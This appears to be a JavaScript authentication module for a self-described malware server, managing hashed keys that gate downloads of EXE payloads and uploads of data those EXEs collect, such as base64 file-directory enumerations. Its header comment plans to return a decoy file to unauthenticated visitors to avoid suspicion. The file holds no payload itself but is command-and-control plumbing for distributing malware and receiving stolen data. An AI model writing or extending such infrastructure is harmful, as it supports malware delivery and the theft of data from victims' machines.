/*
    This module is used to authenticate incoming requests and responses.
    If, for some reason, a request is not authenticated, the server should either throw an error or return a fake "malware" file to not arouse suspicion.
    The keys should be hashed - it seems kind of counterintuitive since this is a malware server, 
    but we don't want someone uploading fake/useless information if they do get access to the server.
*/
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const EXEData = require("./exe_datas.js");
const logging = require("./logging.js");
const { genAsciiStr } = require("./util.js");

/**
 * A class that structures the get and post keys.
 * We'll go more in depth about how the keys are intended to work
 */
module.exports.Keys = class
{
    /**
     * Creates a `Key` object. These keys are stored as `SHA-512` hashes and referenced by their IP.
     * These hashes **will** be saved in a text file by their IP addresses when they're first created.
     * If you're modifying this code yourself, it might make more sense to use a SQL/noSQL database, but I feel it's unnecessary for the scope of this malware server and 
     * only creates more security vulnerabilities (also because MongoDB Atlas is lowkey kind of expensive to keep up and running).
     * You are responsible for appending this into getKeys/setKeys/other relevant dictionaries
     * @param {String} key Intended Password/Key. Ideally, these have a length of 512
     * @param {String} ip Ideally, an IP address goes here so we can track who is generating (and hence, using) the key.
     * @param {Boolean} singleUse Whether or not the key is single use
     * @param {String} usage Use case of the key (ie. ENUMERATE --> Key to upload enumerated directory data). This must match a valid EXE parameter from `./exe_paths.js`
     * @param {String} hash Directly set `this.hash`. This will overwrite the `key` parameter.
     */
    constructor(key, ip, singleUse, usage, hash)
    {
        /**
         * Hash of the password/key. This is stored as hex.
         * @type {String}
         */
        this.hash = hash || crypto.createHash("sha512").update(key).digest("hex");

        /**
         * IP that generated the key.
         * @type {String}
         */
        this.ip = ip;

        /**
         * Whether or not to destroy the key upon use
         * @type {Boolean}
         */
        this.singleUse = singleUse;

        /**
         * What this key is used for. For example, "ENUMERATE" links to the key for uploading file enmumerations in Base64.
         * @type {String}
         */
        if (EXEData[usage] == null && usage != "GET") logging.error(`WARNING: Declared usage ${usage} for ${key} with IP ${ip} is invalid.`);
        this.usage = usage || usage == "GET" ? usage : "";

        /**
         * Path to store the key information in the event of a server restart
         * @type {String}
         */
        this.pathName = path.join(__dirname, "./Keys/", this.hash);

        this.generate_auth_file();
    }

    /**
     * Generates a text file to save the key hash (and other data) in, if it doesn't already exist
     */
    generate_auth_file()
    {
        if (!fs.existsSync(this.pathName))
        {
            fs.writeFileSync(this.pathName, `${this.ip}\n${this.singleUse}\n${this.usage}`, {
                encoding: "ascii"
            });
        }
    }

    /**
     * Deletes the key item and its associated file in `./Keys`
     */
    delete()
    {
        try
        {
            // If file exists, delete it
            if (fs.existsSync(this.pathName))
            {
                fs.unlinkSync(this.pathName);
            }
        }
        catch(err)
        {
            logging.error(`ERROR: cannot remove key file ${key} with IP ${ip}.`);
        }
    }

    /**
     * Creates a key object from file
     * @param {String} pathName Path name (preferably absolute pathing since Express is finnicky) to the file
     * @returns {Keys} A key object using the file contents
     */
    static create_from_file(pathName)
    {
        let read_str = fs.readFileSync(pathName, {
            encoding: "ascii"
        }).split("\n");

        var hash = path.basename(pathName);

        let new_key = new this(undefined, read_str[0], read_str[1] == "true", read_str[2], hash);

        return new_key;
    }
}

/**
 * Basically, a hash map to store authentication keys. (Auth Key Hash) => Auth Key prototype object.
 * For all intents and purposes, treat this like a hash map that allows you to also work with hashes
 */
const AuthKeyContainer = class extends Map
{
    /**
     * Adds an entry in the AuthKeyContainer map. This function will automatically do the hashing for you
     * @param {String} keyValue The actual key
     * @param {Keys} keyObject The key object to insert into the map
     */
    setWithHash(keyValue, keyObject)
    {
        var hash = crypto.createHash("sha512").update(keyValue).digest("hex");
        this.set(hash, keyObject);
    }

    /**
     * Retrieves a key object via the actual generated key value. IF THE KEY IS SINGLE USE, IT GETS DELETED.
     * @param {String} keyValue The actual key. This will be hashed when we try retrieving the Key object
     * @returns {Keys} The key corresponding to the hash of `keyValue`, if it exists. If not, this returns undefined.
     */
    getWithHash(keyValue)
    {
        var hash = crypto.createHash("sha512").update(keyValue).digest("hex");
        const keyObject = this.get(hash);

        if (keyObject != undefined && keyObject.singleUse)
        {
            keyObject.delete();
        }

        return keyObject;
    }
}

/**
 * Valid keys for GET requests to retrieve EXE files.
 * These should never be changed after initialization and its usage should always be "GET"
 */
module.exports.getKeys = new AuthKeyContainer();

/**
 * Valid keys for POST requests to upload information from the EXE files
 */
module.exports.postKeys = new AuthKeyContainer();

// Upon loading auth.js, read through everything in Keys and populate getKeys and postKeys.
fs.readdir(path.resolve(__dirname, "./Keys/"), {
    encoding: "ascii"
}, (err, files) => {
    if (err)
    {
        logging.error("🚨 STARTUP ERROR: Failed to load getKeys and postKeys upon startup");
    }
    else
    {
        logging.log("✅ Retrieved all keys in ./Keys/", true);

        files.forEach(file => {
            var filePath = path.resolve(__dirname, "./Keys/", file);
            let generatedKey = this.Keys.create_from_file(filePath);

            // Recall that only getKeys could have 'GET' as their usage
            if (generatedKey.usage == "GET")
            {
                // Remember that the keys are already hashed in the file name
                this.getKeys.set(generatedKey.hash, generatedKey);
            }
            else
            {
                // Same as above - no need to call setHash
                this.postKeys.set(generatedKey.hash, generatedKey);
            }
        });

        logging.log("✅ getKeys and postKeys directory loaded", true);

        // console.dir(this.getKeys)
        // console.dir(this.postKeys)
    }
});

// 🚨 For test uses only

/**
 * Generates a key. This should only be for testing purposes. This should never be called directly.
 * Side Effect: This creates an auth file for the key
 * @param {String} ip IP address to target for PostKey.
 * @param {boolean} singleUse Whether PostKey should be single use
 * @param {String} usage Usage of key
 * @returns {this.Keys} Newly generated key object
 */
const genKey = (ip, singleUse, usage) => {
    let ascii_str = genAsciiStr(512);
    console.log(`${usage} Key: ${ascii_str}`);
    
    let key = new this.Keys(ascii_str, ip, singleUse, usage);
    return key;
}

/**
 * Generates a key. This should NOT be used during deployment.
 * @param {String} ip IP address to target for PostKey
 * @param {boolean} singleUse Whether PostKey should be single use
 * @param {String} usage Usage of key.
 * @see `this.Key` Class object for Key
 */
const genPostKey = (ip, singleUse, usage) => {
    let postKey = genKey(ip, singleUse, usage);
    this.postKeys.set(postKey.hash, postKey);
}

/**
 * Generates a GET key
 * @param {String} ip IP address to target for GetKey
 */
const genGetKey = (ip) => {
    let getKey = genKey(ip, false, "GET");
    this.getKeys.set(getKey.hash, getKey);
}

// genGetKey("127.0.0.1");